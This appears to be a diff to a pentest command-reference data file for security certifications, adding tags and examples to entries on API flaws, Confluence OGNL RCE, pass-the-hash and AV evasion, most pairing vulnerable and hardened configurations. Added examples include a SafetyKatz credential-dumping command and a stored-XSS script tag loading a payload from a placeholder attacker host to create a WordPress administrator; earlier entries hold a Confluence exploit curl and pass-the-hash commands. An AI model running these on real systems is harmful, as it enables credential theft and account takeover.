@@ -2907,7 +2907,14 @@ const COMMAND_DATA = {
         "misconfiguration": "Authorization check only verifies token validity, not ownership. Server fetches object by ID without joining to authenticated user: SELECT * FROM orders WHERE id = ? (missing AND user_id = current_user_id). UUID v1 chosen over UUID v4 — UUIDs v1 embed timestamp and MAC address, making them predictable.",
         "vulnerable_config": "# Node.js / Express — BOLA vulnerability:\napp.get('/api/v1/users/:id/profile', authenticate, async (req, res) => {\n  // VULNERABLE: checks token is valid, but NOT that req.params.id == req.user.id\n  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.id])\n  if (!user) return res.status(404).json({error:'not found'})\n  res.json(user)  // returns ANY user's profile to any authenticated token\n})\n\n# Python Flask — same pattern:\n@app.route('/api/v1/orders/<int:order_id>')\n@jwt_required()\ndef get_order(order_id):\n  order = Order.query.get(order_id)  # VULNERABLE: no ownership check\n  return jsonify(order.to_dict())\n\n# Sequential ID generation:\nCREATE TABLE orders (id SERIAL PRIMARY KEY, ...)  -- attacker iterates 1,2,3...",
         "secure_config": "# Node.js — ownership enforced server-side:\napp.get('/api/v1/users/:id/profile', authenticate, async (req, res) => {\n  // SAFE: only allow access to own profile (or admin role)\n  if (req.params.id !== req.user.id && req.user.role !== 'admin') {\n    return res.status(403).json({error: 'Forbidden'})\n  }\n  const user = await db.query('SELECT id,name,email FROM users WHERE id = ?', [req.params.id])\n  res.json(user)\n})\n\n# Python Flask — ownership in query:\n@app.route('/api/v1/orders/<int:order_id>')\n@jwt_required()\ndef get_order(order_id):\n  current_uid = get_jwt_identity()\n  # ownership baked into the query — no bypass possible\n  order = Order.query.filter_by(id=order_id, user_id=current_uid).first_or_404()\n  return jsonify(order.to_dict())\n\n# Use UUID v4 instead of SERIAL to slow enumeration:\nCREATE TABLE orders (id UUID DEFAULT gen_random_uuid() PRIMARY KEY, ...)\n\n# Rate-limit per token on sensitive endpoints:\n# Allow: 60 requests/minute per auth token to /api/v1/users/*"
-      }
+      },
+      "tags": [
+        "api",
+        "bola",
+        "idor",
+        "enumeration",
+        "authorization"
+      ]
     },
     {
       "id": "api-ffuf-json-bruteforce",
@@ -3003,7 +3010,14 @@ const COMMAND_DATA = {
         "misconfiguration": "No rate-limiting on the authentication endpoint. No account lockout policy. Default or missing security headers (no CAPTCHA, no bot detection). API login endpoint not differentiated from regular endpoints in WAF rules. JSON body accepted without validation — any field combination tried. Auth failure response reveals whether username exists (user enumeration via different error messages).",
         "vulnerable_config": "# Node.js — no rate-limit, no lockout:\napp.post('/api/v1/login', async (req, res) => {\n  const { username, password } = req.body\n  const user = await db.query('SELECT * FROM users WHERE username=?', [username])\n  if (!user) return res.status(401).json({error: 'Invalid username'})  // VULN: username enumeration\n  if (!bcrypt.compareSync(password, user.password_hash))\n    return res.status(401).json({error: 'Invalid password'})  // VULN: different error = username valid\n  res.json({ token: generateJWT(user) })  // VULN: unlimited attempts\n})\n\n# No WAF rule for auth endpoint\n# No CAPTCHA\n# No MFA required",
         "secure_config": "# Node.js — rate-limited, locked, constant-time response:\nconst rateLimit = require('express-rate-limit')\nconst loginLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,  // 15 min window\n  max: 10,                     // 10 attempts per IP per window\n  standardHeaders: true,\n  legacyHeaders: false,\n  message: { error: 'Too many attempts, try again later' }\n})\napp.post('/api/v1/login', loginLimiter, async (req, res) => {\n  const { username, password } = req.body\n  const user = await db.query('SELECT * FROM users WHERE username=?', [username])\n  // SAFE: same error and same timing whether username exists or not\n  const valid = user && await bcrypt.compare(password, user.password_hash)\n  if (!valid) {\n    await bcrypt.hash('dummy', 10)  // constant-time even if user not found\n    return res.status(401).json({ error: 'Invalid credentials' })  // generic message\n  }\n  // Check failed attempts and enforce lockout\n  if (user.failed_attempts >= 5) return res.status(423).json({ error: 'Account locked' })\n  res.json({ token: generateJWT(user) })\n})\n\n# WAF rule (nginx + ModSecurity or AWS WAF):\n# Rate-limit /api/v1/login to 10 req/min per IP\n# Block User-Agent containing 'ffuf' or 'python-requests' on auth endpoints"
-      }
+      },
+      "tags": [
+        "api",
+        "brute-force",
+        "ffuf",
+        "credential",
+        "json"
+      ]
     },
     {
       "id": "api-version-enum",
@@ -3098,7 +3112,13 @@ const COMMAND_DATA = {
         "misconfiguration": "Legacy API versions left active in routing configuration but removed from documentation and security review. No API gateway allowlist enforcing active-only routes. Beta/test API routes deployed to production without authentication. Different security middleware applied to v1 vs v2 routes — v1 lacks auth requirement. No automated inventory audit against deployed routes.",
         "vulnerable_config": "# Express — v1 left active with weaker controls:\nconst router_v1 = express.Router()\nconst router_v2 = express.Router()\n\n// v2 has auth middleware:\napp.use('/api/v2', authenticate, router_v2)\n\n// v1 forgotten — no auth, still active:\napp.use('/api/v1', router_v1)  // VULNERABLE: /api/v1/users returns full PII without auth\napp.use('/api/beta', router_v1) // VULNERABLE: beta alias also active\n\n// Django urls.py — deprecated paths not removed:\nurlpatterns = [\n  path('api/v2/', include('api_v2.urls')),\n  path('api/v1/', include('api_v1.urls')),  # VULNERABLE: never removed\n  path('api/internal/', include('api_internal.urls')),  # VULNERABLE: debug routes\n]",
         "secure_config": "# Express — only active version mounted, gateway enforces allowlist:\n// Remove all unused router registrations:\napp.use('/api/v2', authenticate, rateLimiter, router_v2)\n// v1 completely removed — no route handler, no 404 → 410 Gone:\napp.use('/api/v1', (req, res) => res.status(410).json({ error: 'API v1 retired. Use /api/v2' }))\napp.use('/api/beta', (req, res) => res.status(410).json({ error: 'Beta API retired.' }))\n\n# API Gateway (Kong) — path allowlist:\n# services:\n#   - name: api-v2-only\n#     url: http://backend:3000/api/v2\n#     routes:\n#       - paths: [/api/v2/]  # only v2 exposed through gateway\n\n# OpenAPI spec as source of truth — CI check:\n# 1. Extract all routes from deployed app\n# 2. Compare against openapi.yaml paths\n# 3. Fail build if unlisted routes found\n\n# Nginx — block old versions at load balancer:\n# location ~ ^/api/v[01]/ {\n#   return 410 '{\"error\": \"API version retired\"}';\n#   add_header Content-Type application/json;\n# }"
-      }
+      },
+      "tags": [
+        "api",
+        "versioning",
+        "enumeration",
+        "improper-inventory"
+      ]
     },
     {
       "type": "command",
@@ -10491,7 +10511,14 @@ const COMMAND_DATA = {
         "misconfiguration": "Confluence exposed to internet without VPN/authentication boundary. Version not patched within days of CVE-2022-26134 disclosure. No WAF in front of Confluence. No process spawn monitoring on the Confluence host.",
         "vulnerable_config": "# Vulnerable Confluence version check:\ncurl -s http://confluence/rest/api/space | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d)'\n# Or check: http://confluence/login.action → check version footer\n# Versions < 7.18.1 (June 2022) = vulnerable\n\n# Test (CVE-2022-26134):\ncurl 'http://confluence:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/'\n# → Should return confluence user ID if vulnerable",
         "secure_config": "# 1. Patch Confluence immediately to 7.18.1+ (or LTS equivalent)\n\n# 2. WAF rule blocking OGNL injection in URI (ModSecurity):\n# SecRule REQUEST_URI '@rx (?i)(\\$|%24)(\\{|%7b)' \\\n#   'id:1001,phase:1,deny,status:403,msg:OGNL Injection Attempt'\n\n# 3. Network access control:\n# Confluence should only be accessible from corporate VPN:\n# iptables -A INPUT -p tcp --dport 8090 -s vpn_cidr -j ACCEPT\n# iptables -A INPUT -p tcp --dport 8090 -j DROP\n\n# 4. Process monitoring (auditd on Linux):\n# auditctl -a always,exit -F arch=b64 -S execve -F ppid=$(pgrep -f confluence) -k confluence_rce\n# → Alert on any process spawned by Confluence"
-      }
+      },
+      "tags": [
+        "confluence",
+        "ognl",
+        "rce",
+        "injection",
+        "cve-2022-26134"
+      ]
     },
     {
       "id": "crtp-constrained-delegation",
@@ -13593,7 +13620,13 @@ const COMMAND_DATA = {
         "misconfiguration": "No account lockout policy configured. No MFA. Weak password policy (minimum 8 chars with common patterns). Auth failures not monitored or alerted. Rate limiting not implemented on authentication endpoints.",
         "vulnerable_config": "# No lockout policy (Active Directory):\nGet-ADDefaultDomainPasswordPolicy | Select-Object LockoutThreshold, LockoutDuration\n# LockoutThreshold: 0 = no lockout\n# → Unlimited password guessing allowed\n\n# Weak policy:\n# MinPasswordLength: 8, MaxPasswordAge: 0 (never expires)\n# → Short, never-rotated passwords = high crack success rate",
         "secure_config": "# Set lockout policy via GPO:\n# Computer Config → Windows Settings → Security Settings → Account Policies → Account Lockout\n# Lockout threshold: 5 attempts\n# Lockout duration: 30 minutes\n# Reset counter: 15 minutes\n\n# Or PowerShell:\nSet-ADDefaultDomainPasswordPolicy -LockoutThreshold 5 -LockoutDuration (New-TimeSpan -Minutes 30) -LockoutObservationWindow (New-TimeSpan -Minutes 15)\n\n# Modern: enforce passphrase policy:\nSet-ADDefaultDomainPasswordPolicy -MinPasswordLength 16 -ComplexityEnabled $false\n# 16-char passphrases > complex 8-char passwords for cracking resistance\n\n# MFA for all external-facing authentication"
-      }
+      },
+      "tags": [
+        "crunch",
+        "wordlist",
+        "password",
+        "generation"
+      ]
     },
     {
       "id": "cupp-profile",
@@ -20854,6 +20887,12 @@ const COMMAND_DATA = {
           "id": "crtp-golden-ticket",
           "note": "evasive-dcsync krbtgt feeds the golden ticket",
           "rel": "next"
+        }
+      ],
+      "examples": [
+        {
+          "label": "Evasive logonpasswords dump",
+          "command": "Loader.exe -path SafetyKatz.exe -args \"sekurlsa::evasive-logonpasswords\" \"exit\""
         }
       ]
     },
@@ -43584,7 +43623,14 @@ const COMMAND_DATA = {
         "misconfiguration": "Same local admin password on all hosts (allows PtH from any compromised host to all others). Service accounts with plaintext passwords in LSA secrets. CachedLogonsCount > 0 on servers (DA creds cached from interactive sessions). LAPS not deployed.",
         "vulnerable_config": "# Same local admin password everywhere:\n# lsadump::sam → Administrator: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c\n# PtH to every host with that hash → full lateral movement\n\n# Cached domain credentials (10 by default):\n(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon').CachedLogonsCount  # 10\n# DA logged on interactively → DCC2 hash crackable offline",
         "secure_config": "# Deploy LAPS (unique local admin passwords):\n# Install LAPS from Microsoft → extend AD schema → deploy GPO\n# GPO: Computer Config → Admin Templates → LAPS → Password Settings\n# → Password complexity: Large letters+small letters+numbers+specials\n# → Password length: 25\n# → Password age: 30 days\n\n# Set CachedLogonsCount to 0 on servers (no cached domain creds):\nSet-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' -Name CachedLogonsCount -Value 0\n# Via GPO: Interactive logon: Number of previous logons to cache = 0\n\n# Use gMSA instead of service accounts with static passwords:\nNew-ADServiceAccount -Name svc_app -ManagedPasswordIntervalInDays 30 -DNSHostName app.corp.local"
-      }
+      },
+      "tags": [
+        "mimikatz",
+        "lsadump",
+        "sam",
+        "lsa-secrets",
+        "credential-dumping"
+      ]
     },
     {
       "type": "command",
@@ -47997,7 +48043,14 @@ const COMMAND_DATA = {
         "misconfiguration": "Services expose excessive information: version banners, supported auth methods, valid usernames via error responses. IPMI has no authentication (version 2.0 cipher 0 vulnerability). RSH/rexec trust .rhosts files. rsync shares readable anonymously. Oracle TNS allows remote poisoning in older versions.",
         "vulnerable_config": "# IPMI cipher 0 — no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data — auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS — version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
         "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)"
-      }
+      },
+      "tags": [
+        "nikto",
+        "web",
+        "fingerprinting",
+        "recon",
+        "scanner"
+      ]
     },
     {
       "type": "command",
@@ -51521,7 +51574,14 @@ const COMMAND_DATA = {
         "misconfiguration": "Same local admin password on all workstations (no LAPS). NTLM not restricted. Credential Guard not deployed. MDI not deployed. SMB signing not required.",
         "vulnerable_config": "# Same local admin hash on all workstations (no LAPS):\n# Mimikatz dumps: Administrator:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c\n# smbclient -U 'CORP/Administrator%' //ws02/C$ --pw-nt-hash 8846f7eaee8fb117ad06bdd830b7586c\n# → Access to ALL workstations via one hash\n\n# NTLM not restricted:\n(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa').LmCompatibilityLevel  # 3 or lower allows NTLMv1",
         "secure_config": "# LAPS: unique local admin passwords per host:\n# Install LAPS → extend AD schema → GPO:\n# Computer Config → Admin Templates → LAPS → Password Settings: Enabled\n# Length: 25, Complexity: All characters, Age: 30 days\n\n# Disable NTLMv1:\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name LmCompatibilityLevel -Value 5\n# 5 = NTLMv2 only on client; DCs refuse anything below NTLMv2\n\n# Restrict NTLM to specific servers:\n# Computer Config → Windows Settings → Security Settings → Local Policies → Security Options\n# → Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers: Deny all\n\n# Protected Users (no NTLM for members):\nAdd-ADGroupMember 'Protected Users' 'DomainAdmin1'"
-      }
+      },
+      "tags": [
+        "pass-the-hash",
+        "smbclient",
+        "ntlm",
+        "lateral",
+        "pth"
+      ]
     },
     {
       "type": "command",
@@ -66371,7 +66431,14 @@ const COMMAND_DATA = {
         "misconfiguration": "WDAC not deployed — unsigned/modified executables run freely. SmartScreen disabled. No behavioral monitoring for application network behavior anomalies. No file hash validation on delivered executables.",
         "vulnerable_config": "# WDAC not configured:\n# Any PE (including shellter-infected) runs without signature check\n\n# SmartScreen disabled:\n(Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System').EnableSmartScreen  # 0 or absent\n\n# No file hash validation:\n# Delivery mechanism (email, file share) doesn't compare against known-good hashes\n# → shellter-infected PuTTY.exe indistinguishable from real one to users",
         "secure_config": "# WDAC publisher rules catch signature breakage:\n# If PuTTY.exe was signed by Simon Tatham and Shellter breaks the signature:\n# WDAC enforced policy: binary fails publisher check → blocked\nNew-CIPolicy -Level Publisher -FilePath C:\\Policy\\BasePolicy.xml -UserPEs\nConvertFrom-CIPolicy C:\\Policy\\BasePolicy.xml C:\\Windows\\System32\\CodeIntegrity\\SIPolicy.p7b\n\n# Enable SmartScreen:\nSet-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' -Name EnableSmartScreen -Value 1\nSet-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' -Name ShellSmartScreenLevel -Value Block\n\n# Behavioral: Defender for Endpoint network protection:\nSet-MpPreference -EnableNetworkProtection Enabled\n# Alert: putty.exe connecting to non-SSH port = anomaly"
-      }
+      },
+      "tags": [
+        "shellter",
+        "av-evasion",
+        "pe-injection",
+        "msfvenom",
+        "antivirus"
+      ]
     },
     {
       "id": "cdsa-m12-sigma-rules",
@@ -82099,7 +82166,14 @@ const COMMAND_DATA = {
         "misconfiguration": "Services expose excessive information: version banners, supported auth methods, valid usernames via error responses. IPMI has no authentication (version 2.0 cipher 0 vulnerability). RSH/rexec trust .rhosts files. rsync shares readable anonymously. Oracle TNS allows remote poisoning in older versions.",
         "vulnerable_config": "# IPMI cipher 0 — no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data — auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS — version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
         "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)"
-      }
+      },
+      "tags": [
+        "wafw00f",
+        "waf",
+        "detection",
+        "recon",
+        "web"
+      ]
     },
     {
       "type": "command",
@@ -86486,7 +86560,13 @@ const COMMAND_DATA = {
         "misconfiguration": "Credentials embedded in config files readable by standard users. Unattend.xml left on disk after OS installation. SSH keys in user home directories without passphrase. KeePass databases with weak master passwords.",
         "vulnerable_config": "# Unattend.xml with plaintext credentials (common after Windows deployment):\nGet-ChildItem C:\\ -Recurse -Include 'Unattend.xml','sysprep.xml' -ErrorAction SilentlyContinue\n# Contains: <AdministratorPassword><Value>PlaintextPass123</Value></AdministratorPassword>\n\n# Web.config with database credentials:\nGet-ChildItem C:\\inetpub -Recurse -Include 'web.config' | Select-String 'password'",
         "secure_config": "# Use DPAPI or Azure Key Vault for application secrets:\n# web.config — use ASP.NET encrypted config sections:\naspnet_regiis -pe 'connectionStrings' -app '/MyApp'\n# → connectionStrings section encrypted with machine key\n\n# Audit for embedded credentials:\nGet-ChildItem C:\\ -Recurse -Include '*.config','*.xml','*.ini','*.txt' -EA SilentlyContinue | Select-String -Pattern 'password\\s*=' -CaseSensitive:$false | Select-Object Filename,Line\n\n# Remove Unattend.xml after OS deployment:\nRemove-Item C:\\Windows\\Panther\\Unattend.xml -ErrorAction SilentlyContinue\nRemove-Item C:\\Windows\\System32\\sysprep\\Unattend.xml -ErrorAction SilentlyContinue"
-      }
+      },
+      "tags": [
+        "windows",
+        "file-search",
+        "powershell",
+        "credential-hunting"
+      ]
     },
     {
       "id": "cdsa-m13-windows-artifacts",
@@ -86900,7 +86980,14 @@ const COMMAND_DATA = {
         "misconfiguration": "Script Block Logging disabled. AMSI not enforced. Sensitive files readable by all users (web.config, connection strings, credential files).",
         "vulnerable_config": "# SBL disabled:\n# HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\n# EnableScriptBlockLogging = 0\n\n# Sensitive config readable by all:\nicacls 'C:\\inetpub\\wwwroot\\web.config'  # Everyone:(R) = credentials exposed",
         "secure_config": "# Enable Script Block Logging:\nSet-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name EnableScriptBlockLogging -Value 1\n\n# Restrict sensitive file permissions:\nicacls 'C:\\inetpub\\wwwroot\\web.config' /inheritance:d\nicacls 'C:\\inetpub\\wwwroot\\web.config' /remove 'Users' /remove 'Everyone'\nicacls 'C:\\inetpub\\wwwroot\\web.config' /grant 'IIS_IUSRS:(R)' 'SYSTEM:(F)' 'Administrators:(F)'\n\n# WDAC: restrict PowerShell to CLM on non-admin hosts"
-      }
+      },
+      "tags": [
+        "windows",
+        "enumeration",
+        "powershell",
+        "privesc",
+        "local"
+      ]
     },
     {
       "type": "command",
@@ -88425,7 +88512,17 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Vulnerable PHP plugin code:\n$wpdb->insert($table_name, array(\n    'useragent' => $_SERVER['HTTP_USER_AGENT'],  // stored raw, no sanitization\n));\n# Later echoed:\necho $record->useragent;  // XSS: any stored <script> tag executes",
         "secure_config": "# Escape on output:\necho esc_html($record->useragent);  // WordPress escaping function\n# Or: echo htmlspecialchars($record->useragent, ENT_QUOTES, 'UTF-8');\n\n# Add CSP header in wp-config.php or .htaccess:\n# Content-Security-Policy: script-src 'self'; object-src 'none'",
         "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
-      }
+      },
+      "examples": [
+        {
+          "label": "Deliver the payload via stored XSS",
+          "command": "<script src=\"http://<attacker>/wp-adduser.js\"></script>   # inject into a field an admin will view"
+        },
+        {
+          "label": "Effect",
+          "command": "# forces the logged-in admin's browser to POST /wp-admin/user-new.php -> creates a new administrator account"
+        }
+      ]
     },
     {
       "type": "command",
@@ -91369,7 +91466,7 @@ const COMMAND_DATA = {
     }
   ],
   "totalCommands": 911,
-  "buildDate": "2026-09-08T23:09:38.495Z",
+  "buildDate": "2026-09-08T23:14:19.210Z",
   "certifications": [
     "CDSA",
     "CPTS",
